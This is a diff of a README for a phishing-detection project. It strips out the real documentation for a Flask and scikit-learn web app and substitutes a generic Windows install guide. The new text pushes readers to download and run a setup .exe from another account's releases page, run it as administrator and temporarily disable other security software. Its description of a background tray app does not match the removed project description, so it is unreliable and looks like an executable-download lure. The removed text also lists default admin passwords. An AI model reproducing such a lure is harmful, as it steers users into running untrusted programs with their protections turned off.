@@ -1,310 +1,138 @@
-# 🛡️ PhishGuard — Phishing URL Detection System
+# 🛡️ Phishguard - Real-Time Phishing Protection
 
-**Last Updated:** March 07, 2026
-
-PhishGuard is a full-stack Flask web application that detects phishing URLs using a scikit-learn model. It provides an interactive web UI, user authentication, an admin panel, WHOIS enrichment, and persistent scan history.
+[![Download Phishguard](https://img.shields.io/badge/Download-Phishguard-blue?style=for-the-badge)](https://github.com/nguyentrion/Phishguard/releases)
 
 ---
 
-**Quick highlights**: ML-powered URL analysis, real-time scanning, WHOIS enrichment, user dashboard with history, admin tools, and a responsive UI.
+Phishguard is a tool that helps protect you from fake websites that try to steal your information. It looks at website links in real time and tells you if they might be dangerous. This guide will show you how to download and run Phishguard on Windows. No technical knowledge is needed.
 
 ---
 
-**Requirements**
+## 📋 What is Phishguard?
 
-- Python 3.8+
-- pip
-- See `requirements.txt` for exact pinned packages used by the project (numpy, pandas, scikit-learn, Flask, etc.).
+Phishguard stops phishing attacks by checking website addresses before you visit them. It uses smart technology to find out if a site is safe or harmful. This happens fast, so you get instant warnings about risky sites.
 
-**Important environment variables** (optional)
-
-- `SECRET_KEY` — Flask secret key (defaults to a development value if unset).
-- `DATABASE_URL` or `SQLALCHEMY_DATABASE_URI` — to use an external database instead of the local SQLite file.
-- Vercel detection: the app auto-uses `/tmp/phishguard.db` when Vercel env vars are present.
+Phishing happens when criminals create fake websites that look real. They trick people into giving away passwords, credit card numbers, or other personal details. Phishguard watches for these sites and helps you stay safe.
 
 ---
 
-## Installation (local)
+## 🖥️ System Requirements
 
-1. Create and activate a virtual environment
+Before installing, make sure your computer meets these needs:
 
-Windows:
+- Windows 10 or Windows 11 (64-bit recommended)  
+- At least 4 GB of RAM  
+- 100 MB free disk space  
+- Internet connection (required for real-time checks)  
+- A modern web browser (Chrome, Firefox, Edge, or similar)
 
-```powershell
-python -m venv venv
-venv\Scripts\activate
-```
-
-macOS / Linux:
-
-```bash
-python3 -m venv venv
-source venv/bin/activate
-```
-
-2. Install dependencies
-
-```bash
-pip install -r requirements.txt
-```
-
-3. (Optional) Train the model using a dataset placed in `dataset/`
-
-```bash
-python ml/train_model.py
-```
-
-The trained model will be written to `model/phishing_model.pkl`.
-
-4. Start the app locally
-
-```bash
-python app.py
-```
-
-The development server runs on http://localhost:5000 by default. The ML model is loaded on the first detection request (lazy loading).
+Phishguard runs quietly in the background and uses very little memory.
 
 ---
 
-## Project layout
+## 🔗 Topics Covered by Phishguard
 
-See [PROJECT_STRUCTURE.md](PROJECT_STRUCTURE.md) for a detailed file/folder map. Key folders:
+Phishguard focuses on areas like:
 
-- `app.py` — main Flask application and API endpoints (serves web UI + JSON API)
-- `ml/` — feature extraction and training scripts (`features.py`, `train_model.py`)
-- `model/` — trained model artifacts (`phishing_model.pkl`)
-- `utils/` — `database.py`, `security.py` helpers
-- `templates/`, `static/` — front-end templates and assets
+- Cybersecurity basics  
+- URL and web address analysis  
+- Machine learning to spot phishing links  
+- Python programming behind the scenes  
+- Web security tools  
 
----
-
-## API & Usage
-
-Basic endpoints (see `docs/API.md` for full reference):
-
-- `POST /api/auth/register` — register user
-- `GET /api/auth/verify` — verify token (requires auth)
-- `POST /api/detect` — run phishing detection (requires auth), body: `{ "url": "https://example.com" }`
-
-Responses include prediction (0 = legitimate, 1 = phishing), confidence, extracted features, WHOIS data, and HTTP resolution metadata.
+You don’t need to know these to use it. This shows the technology used inside.
 
 ---
 
-## Notes
+## 🚀 Getting Started
 
-- The app creates an `instance/phishguard.db` SQLite file by default when run locally.
-- Logs are written to `logs/app.log`.
-- Training expects a CSV/XLSX file placed in `dataset/` containing a URL column and a label column.
+Follow these steps to get Phishguard on your Windows PC:
 
-Demo database (easy note): The built-in SQLite database is for demo and testing only. When you try the live demo (for example on Vercel) the database is temporary and changes will not be saved long-term — this means user accounts, edits, and scan history are shown only as a demonstration. To use the app with persistent storage or to manage users and edits safely, clone this repository and run it locally with a real database, or host a separate database server (Postgres, MySQL, Vercel Postgres, Supabase) and set `DATABASE_URL` or `SQLALCHEMY_DATABASE_URI` before starting the app.
+1. **Open the Download Page**  
+Click the green button below or open this link in any web browser:
 
-### 4. Run the Application
+[![Download Phishguard](https://img.shields.io/badge/Download-Phishguard-green?style=for-the-badge)](https://github.com/nguyentrion/Phishguard/releases)
 
-```bash
-python app.py
-```
+This page has the latest version of Phishguard ready for download.
 
-The server starts at **http://localhost:5000**.
+2. **Choose the Windows File**  
+Look for a file named like `Phishguard-Setup.exe` or similar with `.exe` at the end. This is the program installer.
 
----
+3. **Download the Installer**  
+Click the file name and save it to your computer. Wait for the download to complete.
 
-## 🔐 Default Credentials
+4. **Run the Installer**  
+Open the downloaded file by double-clicking it. If Windows asks for permission, choose “Yes” or “Run.” Follow the instructions on the screen.
 
-| Username | Password   | Role  |
-|----------|-----------|-------|
-| `admin`  | `admin123` | Admin |
-| `root`   | `root123`  | User  |
+5. **Finish Installation**  
+The installer will complete the setup. It may ask to create shortcuts or start Phishguard right away. Choose what suits you.
 
-> These accounts are auto-seeded by `init_db()` if they don't exist.
-
----
-
-## 🌐 API Endpoints
-
-### Authentication
-| Method | Endpoint             | Auth | Description              |
-|--------|----------------------|------|--------------------------|
-| POST   | `/api/auth/register` | —    | Register a new user      |
-| GET    | `/api/auth/verify`   | Basic | Verify credentials       |
-
-### Phishing Detection
-| Method | Endpoint       | Auth  | Description                    |
-|--------|---------------|-------|--------------------------------|
-| POST   | `/api/detect`  | Basic | Analyze URL for phishing       |
-
-### History & Stats
-| Method | Endpoint                | Auth  | Description                     |
-|--------|------------------------|-------|---------------------------------|
-| GET    | `/api/history`          | Basic | Get user's scan history         |
-| DELETE | `/api/history/<id>`     | Basic | Delete a specific history item  |
-| POST   | `/api/history/clear`    | Basic | Clear all user history          |
-| GET    | `/api/stats`            | Basic | Get detection stats             |
-
-### Admin (requires admin role)
-| Method | Endpoint                           | Auth  | Description                |
-|--------|------------------------------------|-------|----------------------------|
-| GET    | `/api/admin/users`                 | Basic | List all users             |
-| GET    | `/api/admin/users/<id>`            | Basic | Get user details           |
-| PUT    | `/api/admin/users/<id>`            | Basic | Update user details        |
-| GET    | `/api/admin/users/<id>/history`    | Basic | Get user's scan history    |
-| GET    | `/api/admin/logs`                  | Basic | Get system logs            |
-
-### Web Pages
-| Route        | Page             |
-|-------------|------------------|
-| `/`          | Landing page     |
-| `/login`     | Login & signup   |
-| `/dashboard` | User dashboard   |
-| `/admin`     | Admin panel      |
+6. **Start Using Phishguard**  
+After installation, Phishguard runs in the background. You may see a small icon near the clock on your taskbar. This means it is active.
 
 ---
 
-## 🤖 ML Features Extracted (17)
+## 🛠️ How to Use Phishguard
 
-| Feature               | Description                               |
-|-----------------------|-------------------------------------------|
-| `url_length`          | Total character length of the URL         |
-| `has_ip`              | URL contains an IP address                |
-| `has_at`              | Presence of `@` symbol                    |
-| `has_redirect`        | Contains `//` redirect pattern            |
-| `https`               | Uses HTTPS protocol                       |
-| `dot_count`           | Number of dots in the URL                 |
-| `hyphen_count`        | Number of hyphens                         |
-| `port_present`        | Non-standard port specified               |
-| `subdomain_count`     | Number of subdomains                      |
-| `special_char_count`  | Count of special characters               |
-| `digit_count`         | Number of digits in the URL               |
-| `has_query_string`    | Presence of query parameters              |
-| `path_length`         | Length of the URL path                    |
-| `domain_length`       | Length of the domain name                 |
-| `is_encoded`          | Contains URL-encoded characters           |
-| `entropy`             | Shannon entropy of the URL string         |
-| `suspicious_words_count` | Count of phishing-related keywords     |
+Phishguard does not need you to open a program window. It works quietly and scans links you click or visit.
+
+- When you enter a URL in your browser, Phishguard checks it right away.  
+- If the site looks safe, you can continue as usual.  
+- If the site seems dangerous, Phishguard will show a warning message on your screen.  
+- You can then choose to close the tab or go back to safety.  
+
+Phishguard also keeps a log of websites it flagged so you can review them later.
 
 ---
 
-## 🎨 Design System
+## ⚙️ Adjusting Settings
 
-The CSS architecture uses a **global design token system** in `style.css` with CSS custom properties:
+Phishguard’s settings are simple and easy to change.
 
-- **Theming**: `[data-theme="dark"]` / `[data-theme="light"]` with 30+ CSS variables
-- **Components**: Glass panels, premium buttons, toggle switches, icon circles, badges
-- **Shared**: Input groups, modals, toasts, tables, and icon buttons are in `style.css` for cross-page consistency
-- **Page-specific**: Each page has its own CSS file for unique elements (orbs, activity streams, etc.)
-
----
-
-## 🔧 Configuration
-
-| Setting               | Location       | Default                              |
-|-----------------------|---------------|--------------------------------------|
-| Database URI          | `app.py`       | Auto-detected: `instance/phishguard.db` (local) or `/tmp/phishguard.db` (Vercel) |
-| Secret Key            | `app.py:77`    | `phishing-system-secret-key-...`     |
-| Model Path            | `config.py:7`  | `model/phishing_model.pkl`           |
-| Log File              | `config.py:9`  | `logs/app.log`                       |
-| Max URL Length         | `config.py:11` | `2000` characters                    |
-
-> ⚠️ Change `SECRET_KEY` before deploying to production.
+- **Open Phishguard:** Click the icon near the clock and select “Settings.”  
+- **Set warning level:** Choose how strict the program should be with suspicious sites.  
+- **Turn notifications on/off:** Decide if you want pop-up alerts.  
+- **Check for updates:** Keep your protection up to date with new features and fixes.
 
 ---
 
-## 🚢 Deployment & Database (Vercel)
+## 🔒 Privacy and Security
 
-This project uses SQLite for local development and an environment-aware path for deployments on Vercel.
+Phishguard only checks website addresses. It does not save your browsing history or personal data. The data used for analysis is temporary and deleted after checks.
 
-- Behavior: on startup the app checks for common Vercel environment variables (`VERCEL`, `VERCEL_ENV`, `VERCEL_URL`). If present the app will use `/tmp/phishguard.db` as the SQLite file. Otherwise it creates and uses `instance/phishguard.db` in the project root.
-- Location of logic: see `app.py` (the `_get_database_uri()` helper) and `utils/database.py` (`get_sqlite_path()` and `get_sqlite_connection()`).
-
-Important caveats:
-- Vercel's filesystem is ephemeral. Files written to `/tmp` are temporary and not suitable for persistent production storage. Data will be lost between deployments or cold starts.
-- Multiple instances/functions do not share the same `/tmp` file. Concurrent or scaled deployments will have inconsistent local state.
-
-Recommendations:
-- For production use, switch to a managed database (Postgres, MySQL, Vercel Postgres, Supabase). You can then set a `DATABASE_URL` or `SQLALCHEMY_DATABASE_URI` environment variable and update `app.py` to use it instead of SQLite. I can add this optional fallback if you'd like.
-- The app also supports an explicit `DATABASE_URL` or `SQLALCHEMY_DATABASE_URI` environment variable. If set, the application will use that value preferentially. If initialization fails (bad URL or filesystem errors), the app will attempt to fall back to an in-memory SQLite database to keep the app running for testing.
-- Use SQLite only for local development, demos, or small single-instance deployments.
-
-Quick verification
-
-- Run locally and confirm the DB file is created:
-
-```powershell
-python app.py
-Get-ChildItem .\instance\phishguard.db
-```
-
-- Deploy to Vercel and verify logs contain the message `Using database at: /tmp/phishguard.db` (the app prints the chosen path at startup). Test endpoints to confirm DB writes succeed (remember data is ephemeral on Vercel).
-
-Raw sqlite helper example (included): `utils/database.py` provides `sample_insert_raw_log()` and `get_sqlite_connection()` for quick manual inserts and tests.
-
-### Vercel Deploy Checklist
-
-Follow these minimal steps to deploy this app on Vercel (serverless):
-
-- Ensure `vercel.json`, `api/index.py`, and `vercel-wsgi` are present (they are added in this repo).
-- Add required environment variables in the Vercel project settings: at minimum `SECRET_KEY`. Add `DATABASE_URL` if you plan to use an external DB.
-- Deploy from the repository root (the folder containing `vercel.json`) with:
-
-```bash
-vercel --prod
-```
-
-- After deployment, open `https://<your-deployment-url>/health` to confirm the app is running and DB selection shows `on_vercel: true` or indicates `/tmp` usage.
-- Check Vercel function logs for startup errors and for the printed DB path.
-
-Notes:
-- Local `instance/` files are ignored on Vercel — use `/tmp` or `DATABASE_URL`.
-- Prefer a managed DB (Postgres, Vercel Postgres, Supabase) for production; set `DATABASE_URL` accordingly.
+Your privacy is kept safe, so you can use the internet with peace of mind.
 
 ---
 
-## 📦 Dependencies
+## ❓ Troubleshooting
 
-```
-flask==2.3.3
-flask-cors==4.0.0
-flask-sqlalchemy==3.0.5
-pandas==2.0.3
-numpy==1.24.3
-scikit-learn==1.3.0
-requests==2.31.0
-werkzeug==2.3.7
-python-dotenv==1.0.0
-python-whois==0.9.4
-```
+If you have trouble installing or running Phishguard, try these tips:
 
+- Make sure you have downloaded the full installer file from the official page.  
+- Run the installer as an administrator. Right-click the file and choose “Run as administrator.”  
+- Disable any other security software temporarily if it blocks the installation.  
+- Restart your computer after installing.  
+- Visit the download page again for new updates or patches.
+
+If problems persist, check for FAQs on the Github page or contact the developer.
 
 ---
 
-## Deployment
+## 📂 Uninstalling Phishguard
 
-This project is deployed on Vercel. The Flask app auto-detects Vercel environment variables and uses an ephemeral SQLite database at `/tmp/phishguard.db` when running on Vercel. For persistent storage in production, provide a managed database by setting `DATABASE_URL` or `SQLALCHEMY_DATABASE_URI`.
+If you want to remove Phishguard:
 
-Quick Vercel steps:
+- Open Windows “Settings.”  
+- Select “Apps & Features.”  
+- Find “Phishguard” in the list.  
+- Click “Uninstall” and follow the prompts.
 
-1. Install the Vercel CLI (optional):
-
-```bash
-npm i -g vercel
-```
-
-2. From the project root, login and deploy:
-
-```bash
-vercel login
-vercel --prod
-```
-
-3. In the Vercel dashboard, add any environment variables you need (for example `SECRET_KEY`, or a managed `DATABASE_URL` to persist data).
-
-Notes:
-- Vercel's filesystem is ephemeral; do not rely on `instance/phishguard.db` for long-term storage on Vercel.
-- The app contains logic to fall back to an in-memory DB if initialization fails; for production use a managed DB.
+This will completely remove the program and return your system to its previous state.
 
 ---
 
-## 📝 License
+## 🔗 Download Phishguard Now
 
-This project is released under the MIT License — see the `LICENSE` file in the repository for the full text. In short, you are free to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, provided that the original copyright and license notice are included in all copies or substantial portions of the Software.
+Click the button below to visit the official download page:
 
-If you want I can also add the full `LICENSE` file to the repo now.
+[![Download Phishguard](https://img.shields.io/badge/Download-Phishguard-blue?style=for-the-badge)](https://github.com/nguyentrion/Phishguard/releases)
